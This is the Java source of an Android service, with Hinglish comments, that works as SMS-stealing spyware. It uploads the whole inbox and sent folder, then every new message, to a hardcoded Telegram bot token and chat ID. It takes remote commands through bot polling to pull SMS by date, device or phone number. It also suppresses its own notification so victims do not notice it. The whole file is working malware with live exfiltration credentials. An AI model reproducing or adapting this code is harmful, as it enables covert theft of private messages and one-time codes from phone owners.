package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsService extends Service {

    static final String BOT_TOKEN = "8755444402:AAFmqp2gnX3BKhbd4RGg0Tvl3DmNx9Whsh8";
    static final String CHAT_ID   = "8623638607";
    static final int    NOTIF_ID  = 9901;
    static final String CH_ID     = "x_hidden";

    private static final String PREFS           = "sms_prefs";
    private static final String KEY_SENT        = "old_sms_sent";
    private static final String KEY_OFFSET      = "last_update_id";
    private static final String KEY_BLOCKED_NOS = "blocked_numbers";
    private static final String KEY_DEVICE_ID   = "device_id";

    private static volatile boolean telegramPaused = false;
    private volatile boolean running = true;
    private Thread pollThread;
    private String myDeviceId;

    // ─── Lifecycle ───────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        myDeviceId = getOrCreateDeviceId();
        startHiddenForeground();
        registerDevice();
        startPolling();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("sms_sender")) {
            if (!telegramPaused) {
                String sender = intent.getStringExtra("sms_sender");
                String body   = intent.getStringExtra("sms_body");
                long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
                if (!isNumberBlocked(sender)) {
                    new Thread(() -> sendSmsToTelegram(sender, body, time)).start();
                }
            }
        } else {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (!prefs.getBoolean(KEY_SENT, false)) {
                prefs.edit().putBoolean(KEY_SENT, true).apply();
                new Thread(this::sendAllOldSms).start();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (pollThread != null) pollThread.interrupt();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    // ─── Device ID ───────────────────────────────────────────
    private String getOrCreateDeviceId() {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        String saved = prefs.getString(KEY_DEVICE_ID, null);
        if (saved != null) return saved;

        // Android ID se unique short ID banao
        String androidId = Settings.Secure.getString(
            getContentResolver(), Settings.Secure.ANDROID_ID);
        String shortId = (androidId != null && androidId.length() >= 6)
            ? androidId.substring(androidId.length() - 6).toUpperCase()
            : "DEV" + (int)(Math.random() * 9999);

        prefs.edit().putString(KEY_DEVICE_ID, shortId).apply();
        return shortId;
    }

    private void registerDevice() {
        new Thread(() -> sendRawMessage(
            "📱 NEW DEVICE ONLINE\n" +
            "Device ID: [" + myDeviceId + "]\n" +
            "Ab is device ke SMS forward honge.\n\n" +
            "Commands:\n" +
            "/device " + myDeviceId + " /all — Is device ke saare SMS\n" +
            "/device " + myDeviceId + " /date 02-01-2022 — Is din ke SMS\n" +
            "/devices — Saare registered devices dekhein"
        )).start();
    }

    // ─── Hidden Notification (poori tarah chhupa do) ─────────
    private void startHiddenForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, ".", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            ch.setDescription("");
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Notification notif = new NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(R.drawable.ic_sword)
            .setContentTitle("Kasari Chauhan")
            .setContentText("Live Update")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(false)
            .setAutoCancel(true)
            .build();

        startForeground(NOTIF_ID, notif);

        // InnerService trick — notification permanently hata do
        startService(new Intent(this, InnerService.class));
    }

    // ─── Bot Polling ─────────────────────────────────────────
    private void startPolling() {
        pollThread = new Thread(() -> {
            while (running) {
                try {
                    checkCommands();
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
                }
            }
        });
        pollThread.setDaemon(true);
        pollThread.start();
    }

    private void checkCommands() throws Exception {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long offset = prefs.getLong(KEY_OFFSET, 0);

        String apiUrl = "https://api.telegram.org/bot" + BOT_TOKEN
            + "/getUpdates?offset=" + (offset + 1) + "&limit=10&timeout=5";

        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        conn.disconnect();

        JSONObject resp = new JSONObject(sb.toString());
        if (!resp.optBoolean("ok", false)) return;

        JSONArray updates = resp.getJSONArray("result");
        for (int i = 0; i < updates.length(); i++) {
            JSONObject update = updates.getJSONObject(i);
            long updateId = update.getLong("update_id");
            prefs.edit().putLong(KEY_OFFSET, updateId).apply();
            if (!update.has("message")) continue;
            JSONObject msg = update.getJSONObject("message");
            if (!msg.has("text")) continue;
            String text   = msg.getString("text").trim();
            String fromId = String.valueOf(msg.getJSONObject("chat").getLong("id"));
            if (!fromId.equals(CHAT_ID)) continue;
            handleCommand(text);
        }
    }

    // ─── Command Handler ─────────────────────────────────────
    private void handleCommand(String cmd) {
        new Thread(() -> {

            // ══ /device DEVICE_ID /COMMAND ══
            // e.g. /device A1B2C3 /all
            //      /device A1B2C3 /date 02-01-2022
            Pattern devPattern = Pattern.compile(
                "(?i)^/device\\s+([A-Z0-9]+)\\s+/(.+)$");
            Matcher dm = devPattern.matcher(cmd.trim());
            if (dm.matches()) {
                String targetId = dm.group(1).toUpperCase();
                String subCmd   = dm.group(2).trim().toLowerCase();
                // Sirf mera device hi respond kare
                if (!targetId.equals(myDeviceId)) return;
                handleDeviceCommand(subCmd);
                return;
            }

            // ══ /devices — saare devices reply karein apni info ══
            if (cmd.equalsIgnoreCase("/devices")) {
                sendRawMessage(
                    "📱 Device Online: [" + myDeviceId + "]\n" +
                    "Commands:\n" +
                    "/device " + myDeviceId + " /all\n" +
                    "/device " + myDeviceId + " /date DD-MM-YYYY\n" +
                    "/device " + myDeviceId + " /stop\n" +
                    "/device " + myDeviceId + " /start"
                );
                return;
            }

            // ══ /NUMBER-/COMMAND (contact filter) ══
            Pattern phonePattern = Pattern.compile("^/([\\d+\\-\\s]+)-/(.+)$");
            Matcher pm = phonePattern.matcher(cmd);
            if (pm.matches()) {
                String number = pm.group(1).trim();
                String subCmd = pm.group(2).trim().toLowerCase();
                handlePhoneCommand(number, subCmd);
                return;
            }

            // ══ Global Commands ══
            if (cmd.equalsIgnoreCase("/stop")) {
                telegramPaused = true;
                sendRawMessage("⏸ Telegram par messages BAND.\nApp chal rahi hai.\n/start se dobara chalu karo.");

            } else if (cmd.equalsIgnoreCase("/start")) {
                telegramPaused = false;
                sendRawMessage("▶ Telegram par messages CHALU!\nNaye SMS ab aayenge.");

            } else if (cmd.equalsIgnoreCase("/all")) {
                telegramPaused = false;
                sendRawMessage("📦 [" + myDeviceId + "] ke saare SMS bhej raha hun...\n/stop se rok sakte ho.");
                sendAllOldSms();
                if (!telegramPaused) sendRawMessage("✅ Saare SMS bhej diye!");

            } else if (cmd.toLowerCase().startsWith("/date ")) {
                String dateStr = cmd.substring(6).trim();
                telegramPaused = false;
                int count = sendSmsByDate(null, dateStr);
                if (!telegramPaused)
                    sendRawMessage(count == 0
                        ? "❌ " + dateStr + " ko koi SMS nahi mila."
                        : "✅ " + dateStr + " ke " + count + " SMS bhej diye!");

            } else if (cmd.equalsIgnoreCase("/blocked")) {
                Set<String> blocked = getBlockedNumbers();
                if (blocked.isEmpty()) {
                    sendRawMessage("✅ Koi bhi number block nahi hai.");
                } else {
                    StringBuilder sb2 = new StringBuilder("🚫 Blocked Numbers:\n");
                    for (String n : blocked) sb2.append("• ").append(n).append("\n");
                    sb2.append("\nUnblock: /NUMBER-/start");
                    sendRawMessage(sb2.toString());
                }

            } else if (cmd.equalsIgnoreCase("/status")) {
                sendRawMessage(
                    "📊 Device: [" + myDeviceId + "]\n" +
                    "App: 🟢 Chal rahi hai\n" +
                    "Telegram: " + (telegramPaused ? "⏸ BAND" : "▶ CHALU") + "\n" +
                    "Blocked: " + getBlockedNumbers().size() + " number"
                );

            } else if (cmd.equalsIgnoreCase("/help")) {
                sendRawMessage(
                    "📋 Global:\n" +
                    "/devices — Online devices dekhein\n" +
                    "/start /stop — Messages on/off\n" +
                    "/all — Saare SMS\n" +
                    "/date DD-MM-YYYY — Us din ke SMS\n" +
                    "/blocked /status /help\n\n" +
                    "📱 Device Commands:\n" +
                    "/device ID /all\n" +
                    "/device ID /date DD-MM-YYYY\n" +
                    "/device ID /stop\n" +
                    "/device ID /start\n\n" +
                    "📞 Number Filter:\n" +
                    "/NUMBER-/all\n" +
                    "/NUMBER-/date DD-MM-YYYY\n" +
                    "/NUMBER-/stop\n" +
                    "/NUMBER-/start\n\n" +
                    "Mera ID: [" + myDeviceId + "]"
                );
            }
        }).start();
    }

    // ─── Device-specific Commands ────────────────────────────
    private void handleDeviceCommand(String subCmd) {
        if (subCmd.equals("stop")) {
            telegramPaused = true;
            sendRawMessage("⏸ [" + myDeviceId + "] ke messages band.\n/device " + myDeviceId + " /start se chalu karo.");

        } else if (subCmd.equals("start")) {
            telegramPaused = false;
            sendRawMessage("▶ [" + myDeviceId + "] ke messages chalu!");

        } else if (subCmd.equals("all")) {
            telegramPaused = false;
            sendRawMessage("⭐ [" + myDeviceId + "] ke SAARE SMS bhej raha hun...\n/stop se rok sakte ho.");
            sendAllOldSms();
            if (!telegramPaused) sendRawMessage("✅ [" + myDeviceId + "] ke saare SMS bhej diye!");

        } else if (subCmd.startsWith("date ")) {
            String dateStr = subCmd.substring(5).trim();
            int count = sendSmsByDate(null, dateStr);
            if (!telegramPaused)
                sendRawMessage(count == 0
                    ? "❌ " + dateStr + " ko koi SMS nahi mila."
                    : "✅ [" + myDeviceId + "] " + dateStr + " ke " + count + " SMS bhej diye!");
        }
    }

    // ─── Phone Number Commands ────────────────────────────────
    private void handlePhoneCommand(String number, String subCmd) {
        if (subCmd.equals("stop")) {
            blockNumber(number);
            sendRawMessage("🚫 " + number + " ke SMS band.\nUnblock: /" + number + "-/start");
        } else if (subCmd.equals("start")) {
            unblockNumber(number);
            sendRawMessage("✅ " + number + " ke SMS dobara chalu.");
        } else if (subCmd.equals("all")) {
            sendRawMessage("⭐ " + number + " ke SAARE SMS...\n/stop se rok sakte ho.");
            int count = queryByNumberAndSend(number, -1, -1);
            if (!telegramPaused)
                sendRawMessage(count == 0 ? "❌ Nahi mila." : "✅ " + count + " SMS bhej diye!");
        } else if (subCmd.startsWith("date ")) {
            String dateStr = subCmd.substring(5).trim();
            int count = sendSmsByDate(number, dateStr);
            if (!telegramPaused)
                sendRawMessage(count == 0
                    ? "❌ " + number + " ka " + dateStr + " ko nahi mila."
                    : "✅ " + count + " SMS bhej diye!");
        }
    }

    // ─── Blocked Numbers ─────────────────────────────────────
    private boolean isNumberBlocked(String number) {
        if (number == null) return false;
        String clean = cleanNum(number);
        for (String b : getBlockedNumbers()) {
            String bc = cleanNum(b);
            if (bc.equals(clean) || clean.endsWith(bc) || bc.endsWith(clean)) return true;
        }
        return false;
    }
    private String cleanNum(String n) {
        return n == null ? "" : n.replaceAll("[^0-9]", "");
    }
    private Set<String> getBlockedNumbers() {
        return new HashSet<>(getSharedPreferences(PREFS, MODE_PRIVATE)
            .getStringSet(KEY_BLOCKED_NOS, new HashSet<>()));
    }
    private void blockNumber(String n) {
        Set<String> s = getBlockedNumbers(); s.add(n);
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putStringSet(KEY_BLOCKED_NOS, s).apply();
    }
    private void unblockNumber(String number) {
        Set<String> s = getBlockedNumbers();
        s.removeIf(n -> {
            String c1 = cleanNum(n), c2 = cleanNum(number);
            return c1.equals(c2) || c2.endsWith(c1) || c1.endsWith(c2);
        });
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putStringSet(KEY_BLOCKED_NOS, s).apply();
    }

    // ─── Query by Number ─────────────────────────────────────
    private int queryByNumberAndSend(String number, long startMs, long endMs) {
        int count = 0;
        String[] folders = {"content://sms/inbox", "content://sms/sent"};
        boolean[] sent    = {false, true};
        for (int f = 0; f < folders.length; f++) {
            Cursor cursor = null;
            try {
                String last10 = cleanNum(number);
                if (last10.length() > 10) last10 = last10.substring(last10.length() - 10);
                String   sel  = startMs > 0
                    ? "address LIKE ? AND date >= ? AND date <= ?"
                    : "address LIKE ?";
                String[] args = startMs > 0
                    ? new String[]{"%" + last10 + "%", String.valueOf(startMs), String.valueOf(endMs)}
                    : new String[]{"%" + last10 + "%"};
                cursor = getContentResolver().query(Uri.parse(folders[f]),
                    new String[]{"address","body","date"}, sel, args, "date ASC");
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        if (telegramPaused) break;
                        String label = sent[f] ? "[Bheja: " + cursor.getString(0) + "]" : cursor.getString(0);
                        sendSmsToTelegram(label, cursor.getString(1), cursor.getLong(2));
                        count++;
                        Thread.sleep(400);
                    } while (cursor.moveToNext());
                }
            } catch (Exception e) { e.printStackTrace(); }
            finally { if (cursor != null) cursor.close(); }
        }
        return count;
    }

    // ─── SMS by Date ─────────────────────────────────────────
    private int sendSmsByDate(String number, String dateStr) {
        try {
            Date date = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).parse(dateStr);
            if (date == null) { sendRawMessage("❌ Format: /date 02-01-2022"); return 0; }
            Calendar cal = Calendar.getInstance();
            cal.setTime(date);
            cal.set(Calendar.HOUR_OF_DAY, 0);  cal.set(Calendar.MINUTE, 0);  cal.set(Calendar.SECOND, 0);
            long start = cal.getTimeInMillis();
            cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59);
            long end = cal.getTimeInMillis();

            String header = number != null
                ? "⭐⭐⭐ " + number + " | " + dateStr + " ⭐⭐⭐"
                : "⭐⭐⭐ [" + myDeviceId + "] | " + dateStr + " ⭐⭐⭐";
            sendRawMessage(header + "\n/stop se rok sakte ho.");

            return number != null
                ? queryByNumberAndSend(number, start, end)
                : queryAndSend("content://sms/inbox", start, end, false)
                + queryAndSend("content://sms/sent",  start, end, true);
        } catch (Exception e) { sendRawMessage("❌ Error: " + e.getMessage()); return 0; }
    }

    private int queryAndSend(String uri, long start, long end, boolean isSent) {
        int count = 0; Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Uri.parse(uri),
                new String[]{"address","body","date"},
                "date >= ? AND date <= ?",
                new String[]{String.valueOf(start), String.valueOf(end)}, "date ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (telegramPaused) break;
                    String label = isSent ? "[Bheja: " + cursor.getString(0) + "]" : cursor.getString(0);
                    sendSmsToTelegram(label, cursor.getString(1), cursor.getLong(2));
                    count++; Thread.sleep(400);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) { e.printStackTrace(); }
        finally { if (cursor != null) cursor.close(); }
        return count;
    }

    private void sendAllOldSms() {
        queryAndSend("content://sms/inbox", 0, Long.MAX_VALUE, false);
        queryAndSend("content://sms/sent",  0, Long.MAX_VALUE, true);
    }

    // ─── Telegram ────────────────────────────────────────────
    static void sendSmsToTelegram(String sender, String body, long ts) {
        if (telegramPaused) return;
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault()).format(new Date(ts));
            postToTelegram("From: " + sender + "\nMsg: " + body + "\nTime: " + date);
        } catch (Exception e) { e.printStackTrace(); }
    }
    public static void sendToTelegram(String sender, String body, long ts) {
        sendSmsToTelegram(sender, body, ts);
    }
    static void sendRawMessage(String text) {
        try { postToTelegram(text); } catch (Exception e) { e.printStackTrace(); }
    }
    static void postToTelegram(String text) throws Exception {
        String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                    + "&text="   + URLEncoder.encode(text, "UTF-8");
        URL url = new URL(api);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("POST"); c.setConnectTimeout(10000); c.setReadTimeout(10000);
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        OutputStream os = c.getOutputStream();
        os.write(data.getBytes("UTF-8")); os.flush();
        c.getInputStream(); c.disconnect();
    }

    // ─── InnerService — notification permanently hata do ─────
    public static class InnerService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification n = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(R.drawable.ic_sword)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true).build();
                startForeground(NOTIF_ID, n);
            }
            // Notification cancel karke service band karo
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.cancel(NOTIF_ID);
            stopForeground(true);
            stopSelf();
            return START_NOT_STICKY;
        }
        @Override public IBinder onBind(Intent intent) { return null; }
    }
}

